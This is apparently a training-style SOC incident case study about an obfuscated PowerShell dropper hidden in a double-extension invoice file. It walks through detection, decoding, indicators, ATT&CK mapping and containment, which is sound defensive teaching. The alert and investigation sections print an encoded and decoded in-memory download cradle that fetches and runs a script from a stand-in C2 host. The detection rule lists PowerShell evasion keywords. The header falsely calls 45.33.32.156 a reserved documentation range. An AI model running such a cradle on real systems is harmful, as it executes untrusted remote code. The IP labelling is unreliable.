# SOC Incident Case Study 02: Obfuscated PowerShell Dropper Investigation

- **Incident ID**: `INC-2026-002`
- **Severity**: `CRITICAL`
- **Lead Analyst**: Lead SOC L1 Analyst (`alex.analyst`)
- **Target Host**: `WORKSTATION-CEO.corp.local` (`192.168.1.140`)
- **Affected User**: `alex.executive`
- **C2 Destination IP**: `45.33.32.156:443` (Reserved Documentation / Lab Range)
- **Framework Mapping**: MITRE ATT&CK `T1059.001 - Command and Scripting Interpreter: PowerShell`

---

## 1. Incident Summary

On September 12, 2026, at 10:43 UTC, ThreatWatch's endpoint detection module flagged Windows Event ID 4688 telemetry on `WORKSTATION-CEO`. A double-extension binary (`invoice_2026.pdf.exe`) launched an obfuscated, hidden PowerShell process (`powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ...`). Inspection in ThreatWatch's Safe Educational PowerShell Inspector revealed a download cradle retrieving a remote script (`invoke.ps1`) from an external domain, followed by an outbound TCP 443 beacon to C2 IP `45.33.32.156` by spawned binary `svchost_updater.exe`. SOC analysts initiated emergency containment, quarantining the workstation from the corporate subnet within 15 minutes of initial execution.

---

## 2. Detection

- **Detection Rule**: `RULE-ENDPOINT-003` (`SUSPICIOUS_POWERSHELL`)
- **Trigger Logic**: The ThreatWatch detection engine scans process creation events (Windows Event ID 4688 / Sysmon Event 1) for `powershell.exe` containing evasion flags (`-enc`, `-encodedcommand`, `downloadstring`, `iex`, `-nop`, `-w hidden`, `-exec bypass`).
- **Alert Dispatched**:
  ```json
  {
    "alert_id": "ALT-003",
    "title": "Obfuscated PowerShell Execution Detected on WORKSTATION-CEO",
    "severity": "HIGH",
    "rule_id": "RULE-ENDPOINT-003",
    "mitre_technique": "T1059.001",
    "source_host": "WORKSTATION-CEO",
    "username": "alex.executive",
    "process_name": "powershell.exe",
    "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBuAGUAdAAvAGkAbgB2AG8AawBlAC4AcABzADEAJwApAA=="
  }
  ```

---

## 3. Initial Triage

1. **Host Context**: Verified `WORKSTATION-CEO` is assigned to executive leadership, designated as a high-value endpoint.
2. **Flag Analysis**: The combination of `-NoP` (NoProfile), `-NonI` (NonInteractive), `-W Hidden` (WindowStyle Hidden), and `-Exec Bypass` (ExecutionPolicy Bypass) confirms deliberate defensive evasion.
3. **Escalation**: Due to endpoint criticality and high probability of malware delivery, the alert was escalated to `CRITICAL` Incident `INC-2026-002`.

---

## 4. Evidence Collected

### Process Creation Hierarchy (Event ID 4688)

Telemetry visualized in ThreatWatch's Windows Security view (`/windows`):

```
PID: 2840  C:\Windows\explorer.exe (User: alex.executive)
   │
   └──► PID: 4120  invoice_2026.pdf.exe [Spawning secondary process]
          │
          ├──► PID: 5884  powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQB... [T1059.001]
          │
          └──► PID: 6104  svchost_updater.exe -connect 45.33.32.156:443 [C2 Beacon]
```

Raw Event Log Record:
```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-09-12T10:43:18Z"/>
    <Computer>WORKSTATION-CEO.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">alex.executive</Data>
    <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="ParentProcessName">C:\Users\alex.executive\Downloads\invoice_2026.pdf.exe</Data>
    <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQ...</Data>
  </EventData>
</Event>
```

---

## 5. Investigation

### 1. Payload Inspection & Safe Decoding
Using the built-in ThreatWatch Safe Educational PowerShell Inspector (`/windows`), the Base64 argument was inspected without execution:
- **Encoded String**:
  `SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBuAGUAdAAvAGkAbgB2AG8AawBlAC4AcABzADEAJwApAA==`
- **Decoded Output**:
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/invoke.ps1')
  ```
- **Finding**: The payload is an in-memory download cradle attempting to fetch and execute secondary stage code (`invoke.ps1`) from `malicious-c2.net`.

### 2. Network Correlation
Querying SIEM connection events (`/siem`) revealed that 42 seconds after PowerShell execution, process `svchost_updater.exe` (PID 6104) established an outbound TCP connection to external IP `45.33.32.156` on port 443.

---

## 6. IOC Analysis

Threat Intelligence indicators indexed in ThreatWatch (`/iocs`):

| Indicator Value | Type | Confidence | Context | Defensive Action |
| :--- | :---: | :---: | :--- | :--- |
| `invoice_2026.pdf.exe` | Filename | 95% | Weaponized masqueraded dropper | Blacklisted via endpoint hash |
| `malicious-c2.net` | Domain | 90% | Remote download cradle host | Sinkholed at internal DNS |
| `45.33.32.156` | IPv4 | 95% | C2 command and control beacon destination | Blocked at perimeter firewall |
| `svchost_updater.exe` | Process | 90% | Camouflaged secondary persistence payload | Killed and removed |

---

## 7. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Observation |
| :--- | :---: | :--- | :--- |
| **Execution** | `T1059.001` | PowerShell | Hidden PowerShell launched with execution policy bypass |
| **Defense Evasion** | `T1027` | Obfuscated Files or Information | Command arguments encoded in Base64 Unicode |
| **Defense Evasion** | `T1036.007` | Double File Extension | Executable disguised as `.pdf.exe` |
| **Command & Control** | `T1071.001` | Web Protocols | Secondary binary beaconing over HTTPS to port 443 |

---

## 8. Analyst Reasoning

- **True Positive Assessment**: Legitimate administrative scripts do not run hidden from a user's Downloads directory spawned by an invoice executable. The correlation of evasion flags, in-memory download strings, and external C2 beaconing confirms weaponized malware dropper activity.
- **Urgency**: Critical. Because C2 communications were established, there was an imminent risk of lateral movement across the executive VLAN.

---

## 9. Response / Containment

Executed response actions in ThreatWatch Incident Management (`/incidents`):

1. **Endpoint Isolation**: Triggered **Isolate Host** on `WORKSTATION-CEO.corp.local` to sever network connectivity while maintaining local forensic access.
2. **Process Termination**: Terminated active PIDs `4120`, `5884`, and `6104`.
3. **Perimeter Blocking**: Pushed firewall drop rule for `45.33.32.156` and DNS sinkhole for `malicious-c2.net`.
4. **Credential Revocation**: Reset Active Directory credentials and revoked active Kerberos tickets for `alex.executive`.

---

## 10. Final Conclusion

Endpoint isolation halted potential lateral movement within 15 minutes of initial execution. The malicious process tree was dismantled, network C2 blocked, and credentials secured. Host queued for forensic disk imaging and re-imaging. Incident status transitioned to `Contained`.

---

## 11. Lessons Learned

1. **Process Lineage Monitoring**: Parent-child relationship rules (e.g., Office/PDF readers spawning `powershell.exe` or `cmd.exe`) provide reliable, high-fidelity detection.
2. **PowerShell Constrained Language Mode**: Enable PowerShell Constrained Language Mode (CLM) and AppLocker script rules on non-developer endpoints to prevent execution of unapproved download cradles.
3. **File Extension Visibility**: Enforce Windows Explorer "Always show file extensions" policy via GPO across the enterprise to prevent double-extension deception.
